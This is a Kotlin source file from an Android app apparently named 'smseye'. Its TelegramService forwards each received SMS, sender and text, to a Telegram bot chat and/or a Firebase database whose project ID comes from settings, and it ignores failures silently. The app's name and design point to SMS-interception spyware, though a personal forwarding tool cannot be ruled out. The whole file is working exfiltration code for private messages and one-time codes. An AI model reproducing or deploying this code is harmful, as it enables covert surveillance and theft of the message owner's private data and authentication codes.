package com.example.smseye

import android.content.Context
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.net.URLEncoder

object TelegramService {
    private val client = OkHttpClient()

    fun forwardSms(context: Context, sender: String, message: String) {
        val prefs = context.getSharedPreferences("Settings", Context.MODE_PRIVATE)
        if (!prefs.getBoolean("is_active", true)) return

        val modeIndex = prefs.getInt("mode_index", 0)
        val cleanText = "$sender: $message"
        
        // Telegram Forwarding
        if (modeIndex == 0 || modeIndex == 2) {
            val token = prefs.getString("bot_token", "")
            val chatId = prefs.getString("chat_id", "")
            val url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=${URLEncoder.encode(cleanText, "UTF-8")}"
            client.newCall(Request.Builder().url(url).build()).enqueue(object : Callback {
                override fun onFailure(call: Call, e: java.io.IOException) {}
                override fun onResponse(call: Call, response: Response) { response.close() }
            })
        }

        // Firebase Forwarding (Dynamic from User Script)
        if (modeIndex == 1 || modeIndex == 2) {
            val fbId = prefs.getString("fb_id", "") // এটি স্ক্রিপ্ট থেকে এক্সট্রাক্ট করা প্রজেক্ট আইডি
            if (!fbId.isNullOrEmpty()) {
                val url = "https://$fbId-default-rtdb.firebaseio.com/sms_logs.json"
                val json = JSONObject().apply {
                    put("sender", sender)
                    put("message", message)
                    put("time", System.currentTimeMillis())
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: java.io.IOException) {}
                    override fun onResponse(call: Call, response: Response) { response.close() }
                })
            }
        }
    }
}
